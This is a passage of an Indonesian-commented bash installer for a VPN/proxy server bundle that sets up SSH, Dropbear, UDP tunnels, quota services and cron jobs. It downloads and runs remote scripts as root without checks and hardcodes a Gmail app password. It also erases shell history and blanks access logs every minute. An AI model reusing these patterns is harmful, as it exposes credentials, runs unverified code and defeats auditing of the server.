    fi

    echo ""
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "           Konfigurasi SSH Selesai"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

function limit_quota(){
    clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "             Memulai Pengaturan Batas Kuota"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    print_install "Memasang Skrip Batas Kuota"
    # Unduh dan atur izin untuk skrip 'quota'
    wget -q -O /usr/local/sbin/quota "${REPO}limit/quota"
    if [ $? -eq 0 ]; then
        chmod +x /usr/local/sbin/quota
        # Menghapus karakter Carriage Return (CR) jika ada (dari unduhan Windows)
        sed -i 's/\r//' /usr/local/sbin/quota
        print_success "Skrip 'quota' berhasil dipasang di /usr/local/sbin/."
    else
        print_error "Gagal mengunduh skrip 'quota'."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    print_install "Memasang Skrip Batas IP"
    # Unduh dan atur izin untuk skrip 'limit-ip'
    wget -q -O /usr/bin/limit-ip "${REPO}limit/limit-ip"
    if [ $? -eq 0 ]; then
        chmod +x /usr/bin/limit-ip
        # Menghapus karakter Carriage Return (CR) jika ada
        sed -i 's/\r//' /usr/bin/limit-ip
        print_success "Skrip 'limit-ip' berhasil dipasang di /usr/bin/."
    else
        print_error "Gagal mengunduh skrip 'limit-ip'."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    clear

    # --- Konfigurasi Layanan Systemd untuk Batas IP (LIMIT ALL IP) ---
    print_install "Mengkonfigurasi Layanan Batas IP (vmip, vlip, trip)"

    # Layanan untuk VMESS IP Limit
    cat >/etc/systemd/system/vmip.service << EOF
[Unit]
Description=Layanan Batas IP VMESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vmip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable vmip &>/dev/null
    systemctl restart vmip &>/dev/null
    if systemctl is-active --quiet vmip; then
        print_success "Layanan vmip berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan vmip."
    fi

    # Layanan untuk VLESS IP Limit
    cat >/etc/systemd/system/vlip.service << EOF
[Unit]
Description=Layanan Batas IP VLESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vlip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable vlip &>/dev/null
    systemctl restart vlip &>/dev/null
    if systemctl is-active --quiet vlip; then
        print_success "Layanan vlip berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan vlip."
    fi

    # Layanan untuk TROJAN IP Limit
    cat >/etc/systemd/system/trip.service << EOF
[Unit]
Description=Layanan Batas IP TROJAN Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip trip
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable trip &>/dev/null
    systemctl restart trip &>/dev/null
    if systemctl is-active --quiet trip; then
        print_success "Layanan trip berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan trip."
    fi

    # --- Konfigurasi Layanan Systemd untuk Batas Kuota (SERVICE LIMIT QUOTA) ---
    print_install "Mengkonfigurasi Layanan Batas Kuota (vmess, vless, trojan)"

    # Layanan untuk Kuota VMESS
    cat >/etc/systemd/system/qmv.service << EOF
[Unit]
Description=Layanan Batas Kuota VMESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/local/sbin/quota vmess
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable qmv &>/dev/null
    systemctl restart qmv &>/dev/null
    if systemctl is-active --quiet qmv; then
        print_success "Layanan qmv (kuota VMESS) berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan qmv."
    fi

    # Layanan untuk Kuota VLESS
    cat >/etc/systemd/system/qmvl.service << EOF
[Unit]
Description=Layanan Batas Kuota VLESS Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/local/sbin/quota vless
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable qmvl &>/dev/null
    systemctl restart qmvl &>/dev/null
    if systemctl is-active --quiet qmvl; then
        print_success "Layanan qmvl (kuota VLESS) berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan qmvl."
    fi

    # Layanan untuk Kuota TROJAN
    cat >/etc/systemd/system/qmtr.service << EOF
[Unit]
Description=Layanan Batas Kuota TROJAN Geo Project
After=network.target

[Service]
WorkingDirectory=/root
ExecStart=/usr/local/sbin/quota trojan
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable qmtr &>/dev/null
    systemctl restart qmtr &>/dev/null
    if systemctl is-active --quiet qmtr; then
        print_success "Layanan qmtr (kuota TROJAN) berhasil dikonfigurasi dan dimulai."
    else
        print_error "Gagal mengkonfigurasi atau memulai layanan qmtr."
    fi

    echo ""
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "            Pengaturan Batas Kuota Selesai"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

function udp_mini(){
clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "                 Memulai Pengaturan UDP Mini"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    print_install "Memasang Skrip UDP Mini"
    # Membuat direktori dan mengunduh skrip udp-mini
    mkdir -p /usr/local/geovpn/
    wget -q -O /usr/local/geovpn/udp-mini "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/badvpn/badvpn/udp-mini"
    if [ $? -eq 0 ]; then
        chmod +x /usr/local/geovpn/udp-mini
        print_success "Skrip 'udp-mini' berhasil diunduh dan diberi izin eksekusi."
    else
        print_error "Gagal mengunduh skrip 'udp-mini'."
        return 1 # Keluar dari fungsi jika skrip utama tidak berhasil diunduh
    fi

    print_install "Memasang Layanan Systemd untuk UDP Mini"
    # Mengunduh file layanan systemd
    wget -q -O /etc/systemd/system/udp-mini-1.service "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/badvpn/badvpn/udp-mini-1.service"
    wget -q -O /etc/systemd/system/udp-mini-2.service "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/badvpn/badvpn/udp-mini-2.service"
    wget -q -O /etc/systemd/system/udp-mini-3.service "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/badvpn/badvpn/udp-mini-3.service"

    # Memeriksa apakah semua layanan berhasil diunduh
    if [ ! -f /etc/systemd/system/udp-mini-1.service ] || \
       [ ! -f /etc/systemd/system/udp-mini-2.service ] || \
       [ ! -f /etc/systemd/system/udp-mini-3.service ]; then
        print_error "Gagal mengunduh salah satu atau lebih file layanan UDP Mini."
        return 1
    else
        print_success "Semua file layanan UDP Mini berhasil diunduh."
    fi

    # Memuat ulang daemon systemd
    systemctl daemon-reload

    # Mengaktifkan dan memulai layanan UDP Mini
    for i in 1 2 3; do
        SERVICE_NAME="udp-mini-${i}.service"
        print_install "Mengelola Layanan $SERVICE_NAME"
        systemctl disable "$SERVICE_NAME" &>/dev/null
        systemctl stop "$SERVICE_NAME" &>/dev/null
        systemctl enable "$SERVICE_NAME" &>/dev/null
        systemctl start "$SERVICE_NAME" &>/dev/null

        if systemctl is-active --quiet "$SERVICE_NAME"; then
            print_success "Layanan $SERVICE_NAME berhasil diaktifkan dan dimulai."
        else
            print_error "Gagal mengaktifkan atau memulai layanan $SERVICE_NAME."
        fi
    done

    echo ""
    print_success "Pengaturan UDP Mini Selesai!"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

function ssh_udp(){
    clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "               Memulai Pengaturan SSH UDP"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    print_install "Membuat direktori dan mengunduh file SSH UDP"
    # Buat direktori khusus untuk SSH UDP
    mkdir -p /etc/geovpn/

    # Unduh file-file yang diperlukan
    wget -q -O /etc/geovpn/udp "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/udp"
    wget -q -O /etc/systemd/system/udp.service "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/udp.service"
    wget -q -O /etc/geovpn/config.json "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/config.json"

    # Periksa apakah semua file berhasil diunduh
    if [ ! -f /etc/geovpn/udp ] || \
       [ ! -f /etc/systemd/system/udp.service ] || \
       [ ! -f /etc/geovpn/config.json ]; then
        print_error "Gagal mengunduh salah satu atau lebih file SSH UDP. Mohon periksa koneksi atau URL repositori."
        return 1 # Keluar dari fungsi jika ada kegagalan unduh
    else
        print_success "Semua file SSH UDP berhasil diunduh."
    fi

    print_install "Mengatur izin eksekusi untuk file SSH UDP"
    # Beri izin eksekusi
    chmod +x /etc/geovpn/udp
    chmod +x /etc/systemd/system/udp.service
    chmod +x /etc/geovpn/config.json

    # Periksa apakah izin berhasil diatur
    if [ $? -eq 0 ]; then
        print_success "Izin eksekusi berhasil diatur."
    else
        print_error "Gagal mengatur izin eksekusi."
        return 1
    fi

    print_install "Mengaktifkan dan memulai layanan SSH UDP"
    # Reload daemon systemd, aktifkan, mulai, dan restart layanan
    systemctl daemon-reload &>/dev/null
    systemctl enable udp &>/dev/null
    systemctl start udp &>/dev/null
    systemctl restart udp &>/dev/null

    # Periksa status layanan
    if systemctl is-active --quiet udp; then
        print_success "Layanan SSH UDP berhasil diaktifkan dan berjalan."
    else
        print_error "Gagal mengaktifkan atau memulai layanan SSH UDP."
        return 1
    fi

    echo ""
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "           Pengaturan SSH UDP Selesai"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
    # Tampilkan status layanan untuk konfirmasi
    print_install "Status Layanan SSH UDP:"
    systemctl status udp --no-pager
    echo ""
}

#function ssh_slow(){
#clear
#print_install "Memasang modul SlowDNS Server"
#    wget -q -O /tmp/nameserver "${REPO}slowdns/nameserver" >/dev/null 2>&1
 #   chmod +x /tmp/nameserver
  #  bash /tmp/nameserver | tee /root/install.log
# print_success "SlowDNS"
#}

clear
function ins_SSHD(){
clear
print_install "Memasang SSHD"
wget -q -O /etc/ssh/sshd_config "${REPO}ws/sshd" >/dev/null 2>&1
chmod 700 /etc/ssh/sshd_config
/etc/init.d/ssh restart
systemctl restart ssh
/etc/init.d/ssh status
print_success "SSHD"
}

clear
function ins_dropbear(){
clear
print_install "MENGINSTALL DROPBEAR"
if ! command -v wget &> /dev/null
then
print_error "Wget tidak ditemukan. Memasang wget..."
apt-get update && apt-get install -y wget
fi
wget -q -O /etc/default/dropbear "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/dropbear.conf"
chmod +x /etc/default/dropbear
if ! grep -q "Banner /etc/geovpn.txt" /etc/ssh/sshd_config; then
echo "Banner /etc/geovpn.txt" >> /etc/ssh/sshd_config
fi
sed -i.bak 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/geovpn.txt"@g' /etc/default/dropbear
wget -O /etc/geovpn.txt "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/issue.net"
local OS_ID=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
local OS_VERSION_ID=$(grep -oP '(?<=^VERSION_ID=).+' /etc/os-release | tr -d '"')
if [ "$OS_ID" == "ubuntu" ] && [ "$OS_VERSION_ID" == "24.04" ]; then
print_install "Membersihkan tag HTML dari banner Dropbear untuk Ubuntu 24.04..."
sed -i 's/<[^>]*>//g' /etc/geovpn.txt
sed -i '/^\s*$/d' /etc/geovpn.txt
print_success "Tag HTML berhasil dibersihkan."
fi
systemctl restart dropbear &> /dev/null
if [ $? -ne 0 ]; then
/etc/init.d/dropbear restart &> /dev/null
fi
systemctl status dropbear --no-pager &> /dev/null
if [ $? -ne 0 ]; then
/etc/init.d/dropbear status &> /dev/null
fi
sleep 2
print_success "DROPBEAR"
}

clear
function ins_vnstat(){
clear
print_install "Menginstall Vnstat"
# setting vnstat
apt -y install vnstat > /dev/null 2>&1
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev > /dev/null 2>&1
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
/etc/init.d/vnstat status
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6
print_success "Vnstat"
}

function ins_openvpn(){
clear
print_install "Menginstall OpenVPN"
#OpenVPN
wget ${REPO}ssh/openvpn &&  chmod +x openvpn && ./openvpn
/etc/init.d/openvpn restart
print_success "OpenVPN"
}

function ins_backup(){
clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "                Memulai Pengaturan Backup Server"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    # Instalasi Rclone
    print_install "Memasang Rclone untuk Manajemen Cloud Storage"
    apt install rclone -y
    if [ $? -eq 0 ]; then
        printf "q\n" | rclone config # Menginisialisasi konfigurasi Rclone secara non-interaktif
        print_success "Rclone berhasil dipasang."
    else
        print_error "Gagal memasang Rclone."
        return 1 # Keluar dari fungsi jika Rclone gagal dipasang
    fi

    # Mengunduh konfigurasi Rclone
    print_install "Mengunduh file konfigurasi Rclone"
    mkdir -p /root/.config/rclone/ # Pastikan direktori ada
    wget -O /root/.config/rclone/rclone.conf "${REPO}backup/rclone.conf"
    if [ $? -eq 0 ]; then
        print_success "File konfigurasi Rclone berhasil diunduh."
    else
        print_error "Gagal mengunduh file konfigurasi Rclone."
        # return 1 # Aktifkan jika ini error fatal
    fi

    # Instalasi Wondershaper
    print_install "Memasang Wondershaper untuk Manajemen Bandwidth"
    # Clone repositori Wondershaper
    git clone https://github.com/magnific0/wondershaper.git /tmp/wondershaper_temp
    if [ $? -eq 0 ]; then
        cd /tmp/wondershaper_temp
        sudo make install
        if [ $? -eq 0 ]; then
            cd /root || { print_error "Gagal kembali ke direktori /root."; return 1; }
            rm -rf /tmp/wondershaper_temp
            echo "" > /home/limit # Membuat/mengosongkan file limit
            print_success "Wondershaper berhasil dipasang."
        else
            print_error "Gagal menginstal Wondershaper (make install gagal)."
            cd /root || { print_error "Gagal kembali ke direktori /root."; return 1; }
            rm -rf /tmp/wondershaper_temp
            # return 1 # Aktifkan jika ini error fatal
        fi
    else
        print_error "Gagal mengunduh Wondershaper dari GitHub (git clone gagal)."
        # return 1 # Aktifkan jika ini error fatal
    fi

    # Instalasi msmtp-mta dan dependensi untuk pengiriman email
    print_install "Memasang MSMTP dan Dependensi untuk Notifikasi Email"
    apt install msmtp-mta ca-certificates bsd-mailx -y
    if [ $? -eq 0 ]; then
        print_success "MSMTP dan dependensi berhasil dipasang."
    else
        print_error "Gagal memasang MSMTP dan dependensi."
        # return 1 # Aktifkan jika ini error fatal
    fi

    # Membuat konfigurasi msmtp
    print_install "Mengkonfigurasi MSMTP"
    cat <<EOF >/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user ambebalong@gmail.com
from ambebalong@gmail.com
password ynezhkhchxawicfo
logfile ~/.msmtp.log
EOF
    if [ $? -eq 0 ]; then
        chown -R www-data:www-data /etc/msmtprc
        chmod 600 /etc/msmtprc # Izin yang lebih aman untuk file konfigurasi
        print_success "Konfigurasi MSMTP berhasil dibuat."
    else
        print_error "Gagal membuat konfigurasi MSMTP."
        # return 1 # Aktifkan jika ini error fatal
    fi

    # Mengunduh dan menjalankan skrip IP Server (jika diperlukan)
    print_install "Mengunduh dan menjalankan skrip IP Server"
    wget -q -O /etc/ipserver "${REPO}ssh/ipserver"
    if [ $? -eq 0 ]; then
        bash /etc/ipserver
        print_success "Skrip IP Server berhasil diunduh dan dijalankan."
    else
        print_error "Gagal mengunduh skrip IP Server."
        # return 1 # Aktifkan jika ini error fatal
    fi

    echo ""
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "              Pengaturan Backup Server Selesai"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

clear
function ins_swab(){
clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "          Memulai Pengaturan Swap dan Optimasi Sistem"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    # Instalasi Gotop (Monitoring Tool)
    print_install "Memasang Gotop (Alat Monitoring Sistem)"
    gotop_latest=$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)
    if [[ -z "$gotop_latest" ]]; then
        print_error "Gagal menemukan versi Gotop terbaru. Melewatkan instalasi Gotop."
    else
        gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v${gotop_latest}/gotop_v${gotop_latest}_linux_amd64.deb"
        curl -sL "$gotop_link" -o /tmp/gotop.deb
        if [ $? -eq 0 ]; then
            dpkg -i /tmp/gotop.deb >/dev/null 2>&1
            if [ $? -eq 0 ]; then
                print_success "Gotop versi v${gotop_latest} berhasil dipasang."
            else
                print_error "Gagal memasang paket Gotop (dpkg error). Mungkin ada dependensi yang hilang."
            fi
            rm -f /tmp/gotop.deb
        else
            print_error "Gagal mengunduh Gotop dari GitHub."
        fi
    fi

    # Membuat Swap File sebesar 1GB
    print_install "Membuat dan Mengaktifkan Swap File sebesar 1GB"
    dd if=/dev/zero of=/swapfile bs=1M count=1024
    if [ $? -eq 0 ]; then
        mkswap /swapfile
        chown root:root /swapfile
        chmod 0600 /swapfile >/dev/null 2>&1
        swapon /swapfile >/dev/null 2>&1
        sed -i '$ i\/swapfile\t\tswap\tswap\tdefaults\t0\t0' /etc/fstab
        print_success "Swap file 1GB berhasil dibuat dan diaktifkan."
    else
        print_error "Gagal membuat swap file 1GB. Periksa ruang disk atau izin."
        # return 1 # Aktifkan jika ini adalah error fatal
    fi

    # Sinkronisasi Jam Menggunakan NTP
    print_install "Melakukan Sinkronisasi Jam Sistem via NTP"
    if command -v chronyd &>/dev/null; then
        chronyd -q 'server 0.id.pool.ntp.org iburst'
        if [ $? -eq 0 ]; then
            chronyc sourcestats -v
            chronyc tracking -v
            print_success "Jam sistem berhasil disinkronkan dengan NTP."
        else
            print_error "Gagal melakukan sinkronisasi jam dengan Chrony."
        fi
    elif command -v ntpdate &>/dev/null; then
        ntpdate -u 0.id.pool.ntp.org
        if [ $? -eq 0 ]; then
            print_success "Jam sistem berhasil disinkronkan dengan NTP."
        else
            print_error "Gagal melakukan sinkronisasi jam dengan ntpdate."
        fi
    else
        print_error "Chrony atau ntpdate tidak ditemukan. Sinkronisasi jam dilewati."
    fi

    # Menjalankan Skrip BBR (Optimasi Jaringan)
    print_install "Menjalankan Skrip Optimasi Jaringan (BBR)"
    wget "${REPO}bbr.sh" && chmod +x bbr.sh && ./bbr.sh
    if [ $? -eq 0 ]; then
        print_success "Skrip BBR berhasil dijalankan."
    else
        print_error "Gagal menjalankan skrip BBR. Periksa log BBR untuk detail lebih lanjut."
        # return 1 # Aktifkan jika ini adalah error fatal
    fi

    echo ""
    print_success "Pengaturan Swap dan Optimasi Sistem Selesai!"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

function ins_Fail2ban(){
clear
print_install "Menginstall Fail2ban"
apt -y install fail2ban > /dev/null 2>&1
#sudo systemctl enable --now fail2ban
/etc/init.d/fail2ban restart
/etc/init.d/fail2ban status
print_success "Fail2ban"
}

function DDoS_Deflate(){
clear
print_install "MEMASANG DDoS-Deflate"
wget -qO /usr/sbin/ddos.zip "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/ssh/ddos.zip" >/dev/null 2>&1
unzip /usr/sbin/ddos.zip -d /usr/sbin/
rm -rf /usr/sbin/ddos.zip
chmod +x /usr/sbin/ddos-deflate-master/*
cd /usr/sbin/ddos-deflate-master
./uninstall.sh && ./install.sh
print_success "DDoS-Deflate"
}

function ins_epro(){
clear
print_install "Menginstall ePro WebSocket Proxy"
    wget -O /usr/bin/ws "${REPO}ws/ws" >/dev/null 2>&1
    wget -O /usr/bin/tun.conf "${REPO}ws/tun.conf" >/dev/null 2>&1
    wget -O /etc/systemd/system/ws.service "${REPO}ws/ws.service" >/dev/null 2>&1
    chmod +x /etc/systemd/system/ws.service
    chmod +x /usr/bin/ws
    chmod 644 /usr/bin/tun.conf
systemctl disable ws
systemctl stop ws
systemctl enable ws
systemctl start ws
systemctl restart ws
wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
wget -O /usr/sbin/ftvpn "${REPO}ws/ftvpn" >/dev/null 2>&1
chmod +x /usr/sbin/ftvpn
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

# remove unnecessary files
cd
apt autoclean -y >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
print_success "ePro WebSocket Proxy"
}

function ins_restart(){
clear
print_install "Restarting  All Packet"
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/vnstat restart
systemctl restart haproxy
/etc/init.d/cron restart
    systemctl daemon-reload
    systemctl start netfilter-persistent
    systemctl enable --now nginx
    systemctl enable --now xray
    systemctl enable --now rc-local
    systemctl enable --now dropbear
    systemctl enable --now openvpn
    systemctl enable --now cron
    systemctl enable --now haproxy
    systemctl enable --now netfilter-persistent
    systemctl enable --now ws
    systemctl enable --now fail2ban
history -c
echo "unset HISTFILE" >> /etc/profile

cd
rm -f /root/openvpn
rm -f /root/key.pem
rm -f /root/cert.pem
print_success "All Packet"
}

#Instal Menu
function menu(){
    clear
    print_install "Memasang Menu Packet"
    wget ${REPO}menu/menu.zip
    unzip menu.zip
    chmod +x menu/*
    mv menu/* /usr/local/sbin
    rm -rf menu
    rm -rf menu.zip
}

# Membaut Default Menu 
function profile(){

    clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "          Memulai Konfigurasi Profil dan Dependensi"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    # Reinstall/Install Dependensi Penting
    print_install "Memasang ulang/memasang dependensi sistem"
    echo -e "[ ${green}INFO${NC} ] Memasang bzip2, gzip, coreutils, wget, screen, rsyslog, iftop, htop, net-tools, zip, unzip, curl, nano, sed, gnupg, bc, apt-transport-https, build-essential, dirmngr, libxml-parser-perl, neofetch, git, lsof..."
    apt-get --reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        print_success "Dependensi berhasil dipasang/diperbaiki."
    else
        print_error "Gagal memasang/memperbaiki dependensi. Mungkin ada masalah koneksi atau repositori."
    fi

    # Konfigurasi .profile untuk pesan selamat datang dan menu
    print_install "Mengkonfigurasi pesan sambutan di .profile"
    {
        echo "clear"
        echo "figlet -f slant GEO PROJECT | lolcat"
        echo "sleep 0.5"
        echo "clear"
        echo "menu"
        echo "echo -e \" - Script Mod By Geo Project\" | lolcat"
        echo "echo -e \"\\x1b[96m - Silakan Ketik\\x1b[m \\x1b[92mMENU\\x1b[m \\x1b[96mUntuk Melihat Daftar Perintah\\x1b[m\""
    } >> /root/.profile
    chmod 644 /root/.profile
    if [ $? -eq 0 ]; then
        print_success "Profil login berhasil dikonfigurasi."
    else
        print_error "Gagal mengkonfigurasi profil login."
    fi

    # Menjadwalkan Cron Job untuk kadaluarsa (xp_all)
    print_install "Menjadwalkan Cron Job untuk manajemen kadaluarsa (xp)"
    cat >/etc/cron.d/xp_all <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 0 * * * root /usr/local/sbin/xp
END
    if [ $? -eq 0 ]; then
        print_success "Cron Job 'xp_all' berhasil dibuat."
    else
        print_error "Gagal membuat Cron Job 'xp_all'."
    fi

    # Menjadwalkan Cron Job untuk Daily Reboot
    print_install "Menjadwalkan Cron Job untuk reboot harian"
    cat >/etc/cron.d/daily_reboot <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * * root /sbin/reboot
END
    if [ $? -eq 0 ]; then
        print_success "Cron Job 'daily_reboot' berhasil dibuat."
    else
        print_error "Gagal membuat Cron Job 'daily_reboot'."
    fi

    # Menjadwalkan Cron Job untuk membersihkan log Nginx dan Xray
    print_install "Menjadwalkan Cron Job untuk membersihkan log"
    echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
    echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
    service cron restart
    if [ $? -eq 0 ]; then
        print_success "Cron Jobs pembersihan log berhasil dibuat dan Cron direstart."
    else
        print_error "Gagal membuat Cron Jobs pembersihan log atau restart Cron."
    fi

    # Menyiapkan file untuk Auto Reboot Time
    print_install "Menyiapkan file konfigurasi waktu auto-reboot"
    echo "5" > /home/daily_reboot # Menetapkan waktu reboot default ke jam 5 pagi
    if [ $? -eq 0 ]; then
        print_success "File /home/daily_reboot berhasil dibuat."
    else
        print_error "Gagal membuat file /home/daily_reboot."
    fi

    # Mengkonfigurasi rc-local.service
    print_install "Mengkonfigurasi layanan rc-local.service"
    cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF
    if [ $? -eq 0 ]; then
        print_success "File rc-local.service berhasil dibuat."
    else
        print_error "Gagal membuat file rc-local.service."
    fi

    # Menambahkan shell nologin
    print_install "Menambahkan shell nologin ke /etc/shells"
    echo "/bin/false" >>/etc/shells
    echo "/usr/sbin/nologin" >>/etc/shells
    if [ $? -eq 0 ]; then
        print_success "Shell nologin berhasil ditambahkan."
    else
        print_error "Gagal menambahkan shell nologin."
    fi

    # Mengkonfigurasi /etc/rc.local dengan aturan iptables
    print_install "Mengkonfigurasi /etc/rc.local dengan aturan iptables"
    cat >/etc/rc.local <<EOF
#!/bin/sh -e
# rc.local
# By default this script does nothing.
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent
exit 0
EOF
    chmod +x /etc/rc.local
    if [ $? -eq 0 ]; then
        print_success "File /etc/rc.local berhasil dikonfigurasi dan diberi izin eksekusi."
    else
        print_error "Gagal mengkonfigurasi /etc/rc.local."
    fi

    # Menentukan Waktu Reboot (Hanya logika, tidak ada aksi)
    # Ini hanya pembacaan variabel, tidak ada konfigurasi yang terjadi di sini.
    # Kode ini mungkin perlu direvisi jika tujuannya adalah untuk mengatur waktu reboot secara dinamis.
    AUTOREB=$(cat /home/daily_reboot)
    SETT=11
    TIME_DATE=""
    if [ "$AUTOREB" -gt "$SETT" ]; then
        TIME_DATE="PM"
    else
        TIME_DATE="AM"
    fi

    echo ""
    print_success "Konfigurasi Profil dan Dependensi Selesai."
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""
}

# ---
## Mengaktifkan Layanan Setelah Instalasi
---
function enable_services() {
    clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "                Mengaktifkan Layanan Sistem"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    print_install "Memuat ulang daemon systemd"
    systemctl daemon-reload
    print_success "Daemon systemd berhasil dimuat ulang."

    print_install "Mengaktifkan dan memulai layanan penting"
    # Mengaktifkan dan memulai layanan satu per satu dengan pengecekan status
    services=(
        "netfilter-persistent"
        "rc-local"
        "cron"
        "nginx"
        "xray"
        "haproxy"
    )

    for service_name in "${services[@]}"; do
        systemctl enable --now "$service_name" &>/dev/null
        systemctl restart "$service_name" &>/dev/null # Restart juga untuk memastikan
